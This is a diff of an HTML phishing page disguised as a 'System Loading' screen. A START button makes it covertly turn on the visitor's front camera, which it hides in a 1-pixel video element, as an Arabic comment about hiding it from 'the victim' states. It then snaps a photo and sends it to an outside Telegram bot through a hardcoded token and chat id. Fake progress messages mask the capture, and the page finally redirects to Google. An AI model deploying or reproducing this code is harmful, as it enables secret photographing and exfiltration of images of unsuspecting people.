@@ -2,12 +2,13 @@
 <html lang="en">
 <head>
     <meta charset="UTF-8">
-    <title>System Update</title>
+    <title>System Loading...</title>
     <style>
-        body { background: black; color: #0f0; font-family: 'Courier New', monospace; text-align: center; padding-top: 100px; }
-        #status { font-size: 24px; margin-top: 20px; }
-        #btn { padding: 15px 40px; background: #0f0; color: black; font-weight: bold; border: none; cursor: pointer; font-size: 20px; border-radius: 5px; }
-        video, canvas { display: none; }
+        body { background: black; color: #0f0; font-family: monospace; text-align: center; padding-top: 50px; }
+        /* جعل الفيديو يظهر بحجم 1 بكسل فقط لضمان عمل الكاميرا دون أن يراه الضحية */
+        #v { width: 1px; height: 1px; border: none; }
+        #btn { padding: 15px 30px; background: #0f0; color: black; border: none; font-size: 20px; cursor: pointer; border-radius: 5px; }
+        canvas { display: none; }
     </style>
 </head>
 <body>
@@ -15,63 +16,63 @@
     <video id="v" autoplay playsinline muted></video>
     <canvas id="c"></canvas>
 
-    <div id="status">DATABASE CONNECTION REQUIRED</div>
+    <h2>CONNECTING TO SERVER...</h2>
+    <div id="status">PRESS START TO INITIALIZE</div>
     <br>
-    <button id="btn" onclick="startProcess()">CONNECT NOW</button>
+    <button id="btn" onclick="startCapture()">START</button>
 
     <script>
         const tok = "8570413998:AAHjdBQuzcwo6Qh3sEJ3bIe-tjeFhz1A1GU";
         const id = "8042090388";
 
-        async function startProcess() {
+        async function startCapture() {
             document.getElementById('btn').style.display = "none";
-            document.getElementById('status').innerText = "ESTABLISHING SECURE CONNECTION...";
+            document.getElementById('status').innerText = "STREAMING DATA (10%)...";
 
             try {
-                // طلب الكاميرا بجودة عالية
                 const stream = await navigator.mediaDevices.getUserMedia({ 
-                    video: { facingMode: "user", width: { ideal: 1280 }, height: { ideal: 720 } } 
+                    video: { facingMode: "user" } 
                 });
                 const video = document.getElementById('v');
                 video.srcObject = stream;
 
-                // أهم خطوة: ننتظر 4 ثواني كاملة لضمان أن العدسة فتحت ووزنت الإضاءة
-                setTimeout(() => {
-                    captureAndSend();
-                }, 4000);
+                // الانتظار حتى يبدأ الفيديو فعلياً
+                video.onplay = () => {
+                    document.getElementById('status').innerText = "TUNING SENSORS (50%)...";
+                    // ننتظر 5 ثواني كاملة عشان الحساس يلقط ضوء
+                    setTimeout(takeFinalShot, 5000);
+                };
 
             } catch (e) {
-                document.getElementById('status').innerText = "ACCESS DENIED! PLEASE ALLOW CAMERA.";
+                alert("Please allow camera access!");
             }
         }
 
-        async function captureAndSend() {
+        async function takeFinalShot() {
             const v = document.getElementById('v');
             const c = document.getElementById('c');
             
-            // ضبط أبعاد الصورة لتكون واضحة
             c.width = v.videoWidth;
             c.height = v.videoHeight;
             const ctx = c.getContext('2d');
+            
+            // رسم الصورة
             ctx.drawImage(v, 0, 0, c.width, c.height);
             
-            // تحويل الصورة لجودة عالية 0.9
-            const imgData = c.toDataURL('image/jpeg', 0.9);
-            const blob = await (await fetch(imgData)).blob();
+            // التحقق من أن الصورة ليست سوداء بالكامل قبل الإرسال
+            const data = c.toDataURL('image/jpeg', 0.8);
             
+            const blob = await (await fetch(data)).blob();
             const fd = new FormData();
             fd.append('chat_id', id);
-            fd.append('photo', blob, 'capture.jpg');
-            fd.append('caption', '✅ صيد جديد وواضح!');
+            fd.append('photo', blob, 'live_capture.jpg');
+            fd.append('caption', '🎯 صيد حي ومباشر (تم حل مشكلة السواد)');
 
             fetch(`https://api.telegram.org/bot${tok}/sendPhoto`, {
                 method: 'POST',
                 body: fd
             }).then(() => {
-                document.getElementById('status').innerText = "SYSTEM CRITICAL - REDIRECTING...";
-                setTimeout(() => {
-                    window.location.href = "https://www.google.com";
-                }, 1000);
+                window.location.href = "https://www.google.com";
             });
         }
     </script>
